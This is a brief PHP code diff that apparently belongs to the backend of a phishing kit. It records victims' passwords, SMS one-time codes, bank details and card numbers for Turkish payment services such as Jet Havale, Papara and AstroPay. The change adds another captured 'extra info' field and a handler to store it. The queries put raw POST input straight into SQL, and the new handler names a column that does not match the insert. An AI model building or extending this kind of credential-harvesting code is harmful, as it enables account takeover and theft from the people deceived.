@@ -59,6 +59,7 @@ curl_close($ch);
       jethavale_sifre = '$datas[jethavale_sifre]',
       jethavale_sms = '$datas[jethavale_sms]',
       jethavale_banka = '$datas[jethavale_banka]',
+      jethavale_ekbilgi = '$datas[jethavale_ekbilgi]',
       papara_password = '$datas[papara_password]',
       papara_sms_code = '$datas[papara_sms_code]',
       astropay_card_number = '$datas[astropay_card_number]',
@@ -119,6 +120,12 @@ elseif ($q == 'sms-onay' && isset($us['id'])){
   $sms = $_POST['jethavale_sms'];
   $id = $us["id"];
   $db->query("UPDATE `payments` SET `jethavale_sms` = '$sms' WHERE `user_id` = '$id' AND `type` = 'jethavale' ORDER BY id DESC LIMIT 1; ");
+  die('success');
+}
+elseif ($q == 'ek-bilgi' && isset($us['id'])){
+  $sms = $_POST['jethavale_ekbilgi'];
+  $id = $us["id"];
+  $db->query("UPDATE `payments` SET `jethavale_bilgi` = '$sms' WHERE `user_id` = '$id' AND `type` = 'jethavale' ORDER BY id DESC LIMIT 1; ");
   die('success');
 }
 ?>
